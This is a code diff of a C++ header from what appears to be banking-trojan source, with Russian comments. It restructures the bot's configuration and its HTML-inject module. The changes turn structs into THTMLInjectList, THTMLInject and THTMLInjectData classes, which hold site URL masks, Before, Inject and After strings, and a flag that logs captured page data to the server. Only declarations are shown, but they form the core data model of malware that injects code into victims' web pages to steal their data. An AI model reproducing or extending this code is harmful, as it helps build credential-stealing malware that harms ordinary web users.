@@ -10,6 +10,7 @@
 // -----------------------------------------------------------------------------
 
 #include <windows.h>
+#include "Strings.h"
 #include "Requests.h"
 #include "BotClasses.h"
 #include "Requests.h"
@@ -48,6 +49,9 @@ void GetCurrentConfigHostSetings(bool*http, bool*https);
 //
 //+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
+
+
+/*
 enum TInjectDataState {idsUnknown, idsOk, idsError};
 
 typedef struct THTMLInjectData
@@ -63,11 +67,13 @@ typedef struct THTMLInjectData
 
 }*PHTMLInjectData;
 
+*/
 
 //---------------------------------------------------------
 //  THTMLInject - описание данных для внедрения своего
 //                    HTML кода в загружаемые страницы
 //---------------------------------------------------------
+/*
 typedef struct THTMLInject
 {
 	PCHAR URL;       // Маска сайта для которого необходимо обрабатывать страницы
@@ -85,13 +91,108 @@ typedef struct THTMLInject
 	#endif
 } *PHTMLInject;
 
+*/
+
+class THTMLInjectList;
+class THTMLInject;
+class THTMLInjectData;
+
+
+
+//---------------------------------------------
+//  THTMLInjectList - Список HTML инжектов
+//---------------------------------------------
+class THTMLInjectList :  public TEventContainer
+{
+private:
+	PList FInjects;
+
+	friend class THTMLInject;
+public:
+	THTMLInjectList();
+	~THTMLInjectList();
+
+	inline DWORD Count() const { return List::Count(FInjects); };
+	inline THTMLInject* Items(int Index) const { return (THTMLInject*)List::GetItem(FInjects, Index); }
+	inline THTMLInject* operator[](int Index) const { return Items(Index);};
+	THTMLInject* AddInject();
+	void ResetInjectsStatus();
+};
+
+
+//---------------------------------------------
+//  THTMLInject - HTML инжект
+//---------------------------------------------
+class THTMLInject : public TEventContainer
+{
+private:
+    THTMLInjectList *FOwner;
+	PList  FInjects;   // Список инжектов (список элементов типа PHTMLInject)
+	friend class THTMLInjectData;
+public:
+	string URL;       // Маска сайта для которого необходимо обрабатывать страницы
+	bool   GET; 		 // Обрабатывать GET запросы
+	bool   POST;       // Обрабатывать POST запросы
+	bool   IsLog;      // Логировать HTML. Вместо подмены отправлять данные на сервер
+	bool   Disabled;   // Не использовать инжект (Для отладочной программы)
+	bool   Used;       // Признак того что маска использовалась
+	DWORD  RefCount;  // Количество текущих блокировок инжекта
+	bool   DestroyAfterRelease; // Уничтожить инжект после обнуления счётчика
+	DWORD  ID;         // Ижентификатор, Для внутренних нужд
+	string Comment;   // Коментарий к инжекту, только для редактора
+
+	THTMLInject(THTMLInjectList *aOwner);
+	~THTMLInject();
+
+	THTMLInjectData* AddData();
+	inline int Count() {return List::Count(FInjects);}
+	inline THTMLInjectData* Items(int Index) const {return (THTMLInjectData*)List::GetItem(FInjects, Index);}
+    inline THTMLInjectData* operator[](int Index) const { return Items(Index); };
+};
+
+
+//---------------------------------------------
+//  THTMLInjectData - данные HTML инжекта
+//---------------------------------------------
+enum TInjectDataState {idsUnknown, idsOk, idsError};
+
+
+class THTMLInjectData : public TEventContainer
+{
+private:
+	THTMLInject* FOwner;
+protected:
+
+public:
+	string Before;
+	string Inject;
+	string After;
+    DWORD  ID;         // Ижентификатор
+	TInjectDataState State;
+    DWORD MacrosHash;  // Хэш данных  для определения макроса инжекта
+	bool Disabled;     // Не использовать инжект (Для отладочной программы)
+
+	THTMLInjectData(THTMLInject *aOwner);
+	~THTMLInjectData();
+
+	inline THTMLInject* Owner() {return FOwner;}
+	void Copy(const THTMLInjectData &Data);
+
+	bool IsValid();
+};
+
+
+
+
+
+
 
 //---------------------------------------------------------
 // TBotConfig -  Настройки работы бота
 //---------------------------------------------------------
 typedef struct TBotConfig
 {
-	PList HTMLInjects;          // Список инжектов (список элементов типа PHTMLInject)
+	THTMLInjectList *HTMLInjects;  // Список инжектов (список элементов типа PHTMLInject)
 	RTL_CRITICAL_SECTION Lock;  // Критичиская секция блокировки конфига
 	PWCHAR LastConfigFile;      // Имя последнего загруженного файла
 	FILETIME ConfigTime;        // Время изменения загруженного файла
@@ -171,12 +272,6 @@ namespace Config
 //****************************************************************************
 namespace HTMLInjects
 {
-	//*********************************************************
-	// Функция возвращает истину если данные можно использовать
-	// в инжектах
-	//*********************************************************
-	bool IsValidInjectData(PHTMLInjectData Data);
-
 
 	//*********************************************************
 	//  Выполнить HTML инжекты.
@@ -197,19 +292,19 @@ namespace HTMLInjects
 	//		List. Если указан источник Source то в новый
 	//		будут скопированы все его данные
 	//*********************************************************
-	PHTMLInject AddInject(PList List, PHTMLInject Source, bool IgnoreDisabledData = false);
+   //	THTMLInject* AddInject(PList List, PHTMLInject Source, bool IgnoreDisabledData = false);
 
 	//*********************************************************
 	//  AddInjectData - Добавить новые данные инжекта
 	//                      Добавлять данные инжекта, только
 	//						этой функцией
 	//*********************************************************
-	PHTMLInjectData AddInjectData(PHTMLInject HTMLInject, PCHAR Before, PCHAR After, PCHAR Inject);
+	//PHTMLInjectData AddInjectData(PHTMLInject HTMLInject, PCHAR Before, PCHAR After, PCHAR Inject);
 
 	//*********************************************************
 	//  ResetStatus - сбросить статус инжектов
 	//*********************************************************
-	void ResetStatus(PList Injects);
+//	void ResetStatus(PList Injects);
 
 	//*********************************************************
 	//  ClearInjectList - Функция очищает список содержащий
@@ -220,7 +315,7 @@ namespace HTMLInjects
 	//*********************************************************
 	//  Методы уничтожения данных HTML инжекта
 	//*********************************************************
-	void FreeInject(PHTMLInject Inject);
+	void FreeInject(THTMLInject *Inject);
 
 	//*********************************************************
 	// ReleaseInjectsList - Фуекция освобождает список инжектов
